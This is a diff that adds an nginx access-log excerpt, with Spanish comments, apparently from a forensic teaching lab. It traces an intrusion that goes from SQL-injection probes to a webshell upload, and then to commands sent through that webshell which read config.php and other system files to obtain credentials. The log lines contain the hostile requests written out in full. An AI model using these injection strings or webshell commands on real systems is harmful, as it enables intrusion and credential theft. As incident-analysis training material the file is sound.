@@ -1,0 +1,14 @@
+# Extracto de /var/log/nginx/access.log del portal (portal-soc.xest.local, 10.10.10.10)
+# Dataset de laboratorio IC UT6. Aqui esta el VECTOR DE ENTRADA al entorno (la causa raiz
+# vuelve a PPS: subida de archivos sin validacion). Formato: combined.
+10.10.10.66 - - [14/Jan/2027:09:12:44 +0000] "GET /login.php?id=1'%20OR%20'1'='1 HTTP/1.1" 401 512 "-" "Mozilla/5.0 sqlmap/1.8"
+10.10.10.66 - - [14/Jan/2027:09:12:45 +0000] "GET /login.php?id=1%20UNION%20SELECT%20user,pass%20FROM%20users HTTP/1.1" 200 1841 "-" "Mozilla/5.0 sqlmap/1.8"
+10.10.10.66 - - [14/Jan/2027:09:38:02 +0000] "POST /login.php HTTP/1.1" 302 0 "-" "Mozilla/5.0 (X11; Linux x86_64)"
+10.10.10.66 - - [14/Jan/2027:09:41:17 +0000] "POST /admin/upload.php HTTP/1.1" 200 234 "http://portal-soc.xest.local/admin/" "Mozilla/5.0 (X11; Linux x86_64)"
+10.10.10.66 - - [14/Jan/2027:09:41:18 +0000] "GET /uploads/shell.php HTTP/1.1" 200 12 "-" "Mozilla/5.0 (X11; Linux x86_64)"
+10.10.10.66 - - [14/Jan/2027:09:55:31 +0000] "GET /uploads/shell.php?cmd=cat%20/var/www/config.php HTTP/1.1" 200 407 "-" "Mozilla/5.0 (X11; Linux x86_64)"
+10.10.10.66 - - [14/Jan/2027:09:56:02 +0000] "GET /uploads/shell.php?cmd=id HTTP/1.1" 200 58 "-" "Mozilla/5.0 (X11; Linux x86_64)"
+10.10.10.66 - - [14/Jan/2027:10:02:19 +0000] "GET /uploads/shell.php?cmd=cat%20/etc/hosts HTTP/1.1" 200 289 "-" "Mozilla/5.0 (X11; Linux x86_64)"
+# 09:41 sube shell.php (webshell). 09:55 lee config.php -> credenciales de BD y del panel.
+# Esas credenciales, reutilizadas, dan acceso RDP a WIN-XEST-ADM (10.10.10.50) a las 10:20.
+# La vulnerabilidad de subida sin validar tipo/extension es la CAUSA RAIZ. Sintoma = el implante.
